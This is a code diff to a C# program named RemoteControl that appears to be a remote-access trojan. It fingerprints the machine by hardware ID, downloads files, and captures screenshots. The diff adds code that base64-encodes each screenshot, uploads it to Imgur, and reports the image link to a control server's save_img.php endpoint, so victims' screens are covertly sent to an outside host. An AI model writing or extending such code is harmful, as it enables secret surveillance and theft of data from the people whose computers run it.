@@ -7,6 +7,8 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Drawing.Imaging;
 using System.Management;
+using System.Collections.Specialized;
+using System.Text;
 
 namespace RemoteControl
 {
@@ -16,6 +18,7 @@ namespace RemoteControl
         static string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
         static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         static string link = "http://127.0.0.1";
+        static string imgur_api = "";
 
         static string HWID()
         {
@@ -33,6 +36,23 @@ namespace RemoteControl
             }
             
             return cpuInfo;
+        }
+
+        static string ImageUpload(string base64)
+        {
+            string response;
+            using (WebClient client = new WebClient())
+            {
+                client.Headers.Add("Authorization", "Client-ID " + imgur_api);
+
+                NameValueCollection data = new NameValueCollection();
+                data["image"] = base64;
+                data["type"] = "base64";
+
+                byte[] responsePayload = client.UploadValues("https://api.imgur.com/3/image/", "POST", data);
+                response = Encoding.ASCII.GetString(responsePayload);
+            }
+            return response;
         }
 
         static string GenName()
@@ -79,10 +99,11 @@ namespace RemoteControl
             Byte[] g_byte = File.ReadAllBytes("tmp_img.png");
             String g_str = Convert.ToBase64String(g_byte);
 
-            client.DownloadString(link + "/save_img.php?img="+g_str);
-
             File.Delete("tmp_img.png");
-            
+
+            string[] lines = ImageUpload(g_str).Split('"');
+
+            client.DownloadString(link + "/save_img.php?img="+ "https://imgur.com/"+lines[5]+".png");
         }
 
         static void JdF(string link, string ext)
@@ -161,6 +182,7 @@ namespace RemoteControl
 
         static void Main(string[] args)
         {
+
             if (!FirstRun())
                 Initialize();
 
